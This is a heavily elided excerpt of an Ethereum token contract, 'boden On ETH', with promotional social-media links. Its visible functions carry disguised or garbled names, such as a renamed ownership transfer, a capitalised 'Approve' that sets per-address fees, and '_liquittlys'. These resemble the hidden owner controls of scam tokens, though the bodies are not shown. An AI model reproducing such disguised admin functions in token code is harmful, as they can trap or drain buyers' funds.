...
/**
https://t.me/Jeobodeneth
https://twitter.com/JeobodenOnETH
boden on ETH!
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipliityuinos(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract bodenOnETH is Ownable {
    ...
    constructor (){
        name = unicode"boden On ETH";
        symbol = unicode"boden";
        decimals = 9;
    ...
    function Approve(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _liquittlys(address user) public {
